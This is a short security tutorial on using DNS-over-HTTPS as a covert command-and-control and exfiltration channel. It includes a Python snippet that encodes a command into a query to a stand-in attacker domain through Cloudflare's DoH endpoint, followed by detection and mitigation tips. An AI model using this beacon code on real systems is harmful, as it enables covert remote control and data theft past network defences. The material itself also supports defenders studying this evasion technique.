# 🌐 DNS-over-HTTPS C2 - Covert Channels in Plain Sight

**DNS-over-HTTPS (DoH)** is a stealthy technique that tunnels command-and-control (C2) traffic through encrypted DNS queries to **bypass firewalls, proxies, and DNS logging**. It's ideal for **covert exfiltration and remote access**.

> ⚠️ Used by malware like `Godlua`, `APT29 loaders`, and red teams to evade detection. Blends into normal browser traffic, hard to inspect without deep SSL inspection.

---

## 🛠️ What It Does
- Encodes payloads or C2 commands into DNS queries (e.g., TXT records)
- Sends queries to a **DoH server** (e.g., Cloudflare, Google)
- Receives C2 responses as DNS answers — fully encrypted over HTTPS

---

## 💣 Realistic C2 Flow

### 1. Attacker Sets Up DNS + DoH Endpoint
- Register domain (e.g., `payloads.attacker.com`)
- Host dynamic DNS records (e.g., TXT/AAAA) that return commands
- Configure C2 to query via DoH

---

### 2. Client Beacons Using DoH
Example: Python + `cloudflare-dns.com` DoH endpoint
```python
import requests
import base64

cmd = base64.b64encode(b"whoami").decode()
resp = requests.get(f"https://cloudflare-dns.com/dns-query?name={cmd}.payloads.attacker.com&type=TXT", headers={"accept": "application/dns-json"})
```
✅ Queries attacker-controlled subdomain, gets response in TXT

---

### 3. Receive Command or Exfil Data
Attacker hosts TXT record:
```text
bG9jYWx1c2VyDQ== (base64 of whoami)
```
Client decodes and executes command locally
✅ Encrypted, no obvious indicators in plaintext DNS logs

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Excessive DoH traffic from non-browser apps | Inspect user-agents and headers of outbound HTTPS traffic |
| Frequent queries to Cloudflare/Google DoH endpoints | Alert on known DoH endpoints in unexpected apps |
| Abuse of DNS query frequency or subdomain entropy | Use statistical/entropy analysis on DNS query patterns

---

## 🔐 Mitigation Strategies
- Block/inspect DoH with enterprise proxies and SSL decryption
- Use DNS logging and query analysis tools (e.g., Zeek, Splunk)
- Whitelist approved DoH clients (like browsers only)
- Monitor outbound HTTPS traffic to DoH providers from non-browser processes

---

> 🧠 DNS-over-HTTPS is stealth in plain sight. It’s browser-like, encrypted, and sneaky enough that defenders miss it — unless they’re looking *really* hard. The best part? Most orgs don’t even log DoH today.

Welcome to the quiet channel attackers use when they don’t want to get caught.
